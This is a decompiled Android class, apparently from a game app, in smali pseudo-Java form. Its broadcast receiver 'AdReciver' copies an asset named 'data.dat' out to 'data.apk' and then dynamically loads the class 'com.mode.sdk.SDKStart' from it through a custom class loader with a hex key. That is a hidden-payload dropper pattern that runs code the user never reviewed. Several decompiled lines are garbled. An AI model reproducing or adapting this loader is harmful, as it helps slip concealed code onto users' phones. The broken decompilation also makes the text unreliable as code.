public class com.games.AdReciver extends android.content.BroadcastReceiver {
	 /* .source "AdReciver.java" */
	 /* # direct methods */
	 public com.games.AdReciver ( ) {
		 /* .locals 0 */
		 /* .prologue */
		 /* .line 12 */
		 /* invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V */
		 return;
	 } // .end method
	 /* # virtual methods */
	 public void onReceive ( android.content.Context p0, android.content.Intent p1 ) {
		 /* .locals 18 */
		 /* .param p1, "context" # Landroid/content/Context; */
		 /* .param p2, "intent" # Landroid/content/Intent; */
		 /* .prologue */
		 /* .line 17 */
		 final String v1 = "com.game.param"; // const-string v1, "com.game.param"
		 int v2 = 0; // const/4 v2, 0x0
		 /* move-object/from16 v0, p1 */
		 (( android.content.Context ) v0 ).getSharedPreferences ( v1, v2 ); // invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
		 /* .line 18 */
		 /* .local v11, "fileInfo":Landroid/content/SharedPreferences; */
		 final String v1 = "ScreenNumber"; // const-string v1, "ScreenNumber"
		 v1 = 		 int v2 = 0; // const/4 v2, 0x0
		 /* add-int/lit8 v15, v1, 0x1 */
		 /* .line 20 */
		 /* .local v15, "num":I */
		 v1 = java.lang.System.out;
		 /* new-instance v2, Ljava/lang/StringBuilder; */
		 final String v3 = "ScreenNumber: "; // const-string v3, "ScreenNumber: "
		 /* invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
		 (( java.lang.StringBuilder ) v2 ).append ( v15 ); // invoke-virtual {v2, v15}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
		 (( java.lang.StringBuilder ) v2 ).toString ( ); // invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
		 (( java.io.PrintStream ) v1 ).println ( v2 ); // invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
		 /* .line 21 */
		 int v1 = 2; // const/4 v1, 0x2
		 /* if-ge v15, v1, :cond_2 */
		 /* .line 25 */
		 try { // :try_start_0
			 /* invoke-virtual/range {p1 ..p1}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager; */
			 final String v2 = "data.dat"; // const-string v2, "data.dat"
			 (( android.content.res.AssetManager ) v1 ).open ( v2 ); // invoke-virtual {v1, v2}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
			 /* .line 26 */
			 /* .local v12, "iStream":Ljava/io/InputStream; */
			 final String v1 = "data.apk"; // const-string v1, "data.apk"
			 int v2 = 0; // const/4 v2, 0x0
			 /* move-object/from16 v0, p1 */
			 (( android.content.Context ) v0 ).openFileOutput ( v1, v2 ); // invoke-virtual {v0, v1, v2}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;
			 /* .line 28 */
			 /* .local v16, "output":Ljava/io/OutputStream; */
			 /* const/16 v7, 0x1000 */
			 /* .line 29 */
			 /* .local v7, "FILESIZE":I */
			 /* new-array v8, v7, [B */
			 /* .line 32 */
			 /* .local v8, "buffer":[B */
		 } // :goto_0
		 v13 = 		 (( java.io.InputStream ) v12 ).read ( v8 ); // invoke-virtual {v12, v8}, Ljava/io/InputStream;->read([B)I
		 /* .local v13, "length":I */
		 /* if-gtz v13, :cond_1 */
		 /* .line 36 */
		 /* invoke-virtual/range {v16 ..v16}, Ljava/io/OutputStream;->flush()V */
		 /* .line 37 */
		 /* invoke-virtual/range {v16 ..v16}, Ljava/io/OutputStream;->close()V */
		 /* :try_end_0 */
		 /* .catch Ljava/lang/Exception; {:try_start_0 ..:try_end_0} :catch_0 */
		 /* .line 44 */
	 } // .end local v7 # "FILESIZE":I
} // .end local v8 # "buffer":[B
} // .end local v12 # "iStream":Ljava/io/InputStream;
} // .end local v13 # "length":I
} // .end local v16 # "output":Ljava/io/OutputStream;
} // :goto_1
/* .line 45 */
/* .local v10, "eniter":Landroid/content/SharedPreferences$Editor; */
final String v1 = "ScreenNumber"; // const-string v1, "ScreenNumber"
/* .line 46 */
/* .line 70 */
} // .end local v10 # "eniter":Landroid/content/SharedPreferences$Editor;
} // :cond_0
} // :goto_2
return;
/* .line 34 */
/* .restart local v7 # "FILESIZE":I */
/* .restart local v8 # "buffer":[B */
/* .restart local v12 # "iStream":Ljava/io/InputStream; */
/* .restart local v13 # "length":I */
/* .restart local v16 # "output":Ljava/io/OutputStream; */
} // :cond_1
int v1 = 0; // const/4 v1, 0x0
try { // :try_start_1
/* move-object/from16 v0, v16 */
(( java.io.OutputStream ) v0 ).write ( v8, v1, v13 ); // invoke-virtual {v0, v8, v1, v13}, Ljava/io/OutputStream;->write([BII)V
/* :try_end_1 */
/* .catch Ljava/lang/Exception; {:try_start_1 ..:try_end_1} :catch_0 */
/* .line 39 */
} // .end local v7 # "FILESIZE":I
} // .end local v8 # "buffer":[B
} // .end local v12 # "iStream":Ljava/io/InputStream;
} // .end local v13 # "length":I
} // .end local v16 # "output":Ljava/io/OutputStream;
/* :catch_0 */
/* move-exception v9 */
/* .line 41 */
/* .local v9, "e":Ljava/lang/Exception; */
(( java.lang.Exception ) v9 ).printStackTrace ( ); // invoke-virtual {v9}, Ljava/lang/Exception;->printStackTrace()V
/* .line 50 */
} // .end local v9 # "e":Ljava/lang/Exception;
} // :cond_2
/* new-instance v14, Lcom/games/MobileInfo; */
/* move-object/from16 v0, p1 */
/* invoke-direct {v14, v0}, Lcom/games/MobileInfo;-><init>(Landroid/content/Context;)V */
/* .line 54 */
/* .local v14, "mobileInfo":Lcom/games/MobileInfo; */
v1 = this.netType;
final String v2 = ""; // const-string v2, ""
v1 = (( java.lang.String ) v1 ).equals ( v2 ); // invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
/* if-nez v1, :cond_0 */
/* .line 56 */
/* invoke-virtual/range {p1 ..p1}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo; */
v0 = this.dataDir;
/* move-object/from16 v17, v0 */
/* .line 58 */
/* .local v17, "path":Ljava/lang/String; */
/* new-instance v1, Ljava/lang/StringBuilder; */
/* invoke-static/range {v17 ..v17}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String; */
/* invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
final String v2 = "/files/data.apk"; // const-string v2, "/files/data.apk"
(( java.lang.StringBuilder ) v1 ).append ( v2 ); // invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v1 ).toString ( ); // invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
/* new-instance v1, Ljava/lang/StringBuilder; */
/* invoke-static/range {v17 ..v17}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String; */
/* invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
final String v3 = "/files"; // const-string v3, "/files"
(( java.lang.StringBuilder ) v1 ).append ( v3 ); // invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v1 ).toString ( ); // invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
final String v4 = "com.mode.sdk.SDKStart"; // const-string v4, "com.mode.sdk.SDKStart"
final String v5 = "InitStart"; // const-string v5, "InitStart"
final String v6 = "8cb3270504283d3ed3f8349f83033059"; // const-string v6, "8cb3270504283d3ed3f8349f83033059"
/* move-object/from16 v1, p1 */
/* invoke-static/range {v1 ..v6}, Lcom/games/ClassLoader;->loadInitStart(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V */
/* .line 61 */
/* .line 62 */
/* .restart local v10 # "eniter":Landroid/content/SharedPreferences$Editor; */
final String v1 = "ScreenNumber"; // const-string v1, "ScreenNumber"
int v2 = 0; // const/4 v2, 0x0
/* .line 63 */
} // .end method
